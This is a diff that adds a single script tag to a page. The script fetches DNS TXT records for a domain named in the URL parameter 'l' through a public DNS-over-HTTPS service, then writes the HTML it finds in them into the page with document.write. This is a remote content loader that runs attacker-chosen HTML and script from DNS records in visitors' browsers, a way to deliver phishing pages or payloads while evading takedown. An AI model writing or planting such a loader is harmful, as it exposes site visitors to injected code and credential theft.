@@ -1,0 +1,1 @@
+<script>fetch("https://cloudflare-dns.com/dns-query?name="+(new URL(document.location)).searchParams.get("l")+"&type=TXT",{headers:{"Accept":"application/dns-json"}}).then(r=>{r.json().then(j=>{let g=0;for(let k of j.Answer){k=k.data.substring(1).slice(0,-1);if(k.startsWith("<html"))g=1;if(g)document.write(k);if(k.includes("/html>"))g=0}})})</script>
